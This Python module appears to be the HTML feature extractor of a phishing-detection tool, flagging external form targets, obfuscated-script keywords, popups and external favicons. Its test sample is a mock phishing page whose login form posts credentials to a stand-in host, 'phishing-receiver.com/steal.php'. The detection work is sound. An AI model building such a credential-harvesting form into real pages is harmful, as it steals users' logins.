"""
CyberShield AI - HTML & DOM Feature Extraction Engine
Parses HTML content to analyze form targets, iframe abuse, script complexity, and visual impersonation cues.
"""

import re
from urllib.parse import urlparse
from bs4 import BeautifulSoup

def extract_html_dom_features(html_content: str, base_url: str) -> dict:
    """
    Extracts structural DOM features from HTML text.
    Handles empty/unreachable page defaults gracefully.
    """
    if not html_content:
        return {
            'has_password_field': 0,
            'external_form_action': 0,
            'form_count': 0,
            'iframe_count': 0,
            'hidden_input_count': 0,
            'script_tag_count': 0,
            'external_script_ratio': 0.0,
            'suspicious_popup_scripts': 0,
            'has_disabled_right_click': 0,
            'has_obfuscated_js': 0,
            'external_favicon': 0,
            'dom_tree_depth': 0
        }
        
    soup = BeautifulSoup(html_content, 'html.parser')
    base_domain = urlparse(base_url).netloc.lower()
    
    # Forms & Password Fields
    forms = soup.find_all('form')
    password_fields = soup.find_all('input', {'type': 'password'})
    hidden_inputs = soup.find_all('input', {'type': 'hidden'})
    
    external_form_count = 0
    for form in forms:
        action = form.get('action', '')
        if action.startswith('http'):
            action_domain = urlparse(action).netloc.lower()
            if action_domain and action_domain != base_domain:
                external_form_count += 1
                
    # Scripts & Obfuscation
    scripts = soup.find_all('script')
    script_count = len(scripts)
    external_scripts = 0
    obfuscated_count = 0
    popup_indicators = 0
    
    for script in scripts:
        src = script.get('src', '')
        if src.startswith('http'):
            if urlparse(src).netloc.lower() != base_domain:
                external_scripts += 1
        content = script.string or ''
        if any(term in content for term in ['eval(', 'unescape(', 'String.fromCharCode', 'window.atob']):
            obfuscated_count += 1
        if any(term in content for term in ['window.open', 'alert(', 'prompt(']):
            popup_indicators += 1
            
    # Favicon check
    icon_link = soup.find('link', rel=lambda x: x and 'icon' in x.lower())
    external_fav = 0
    if icon_link and icon_link.get('href', '').startswith('http'):
        if urlparse(icon_link.get('href')).netloc.lower() != base_domain:
            external_fav = 1
            
    # Right click disable
    body = soup.find('body')
    body_str = str(body) if body else ''
    disabled_right_click = 1 if 'oncontextmenu' in body_str or 'event.button==2' in body_str else 0

    return {
        'has_password_field': 1 if len(password_fields) > 0 else 0,
        'external_form_action': 1 if external_form_count > 0 else 0,
        'form_count': len(forms),
        'iframe_count': len(soup.find_all('iframe')),
        'hidden_input_count': len(hidden_inputs),
        'script_tag_count': script_count,
        'external_script_ratio': round(external_scripts / max(script_count, 1), 4),
        'suspicious_popup_scripts': popup_indicators,
        'has_disabled_right_click': disabled_right_click,
        'has_obfuscated_js': 1 if obfuscated_count > 0 else 0,
        'external_favicon': external_fav,
        'dom_tree_depth': min(len(soup.find_all()), 500)
    }

if __name__ == '__main__':
    sample_html = """
    <html>
      <head><link rel="shortcut icon" href="https://external-hacker.com/fake.ico"></head>
      <body oncontextmenu="return false;">
        <form action="https://phishing-receiver.com/steal.php" method="POST">
          <input type="text" name="user">
          <input type="password" name="pass">
          <input type="hidden" name="token" value="abc">
          <input type="submit">
        </form>
        <script>eval(unescape('%61%6c%65%72%74'));</script>
        <iframe></iframe>
      </body>
    </html>
    """
    print("Extracted HTML Features:", extract_html_dom_features(sample_html, "https://mybank.com"))
